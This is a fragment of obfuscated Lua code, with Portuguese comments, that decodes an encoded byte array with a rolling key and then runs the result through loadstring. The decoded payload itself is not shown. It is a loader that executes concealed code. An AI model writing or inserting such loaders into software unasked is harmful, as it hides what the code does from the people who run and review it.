    local function VM_lO1l(d, k, m)
        local R_ll1IO00 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_ll1IO00, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_ll1IO00)
    end

    -- Execution Guard
    local F_I1OOO0lI = loadstring(VM_lO1l(B_OIIIlII, 1, 5))
    if F_I1OOO0lI then
        F_I1OOO0lI(...)
    end
end)(...)
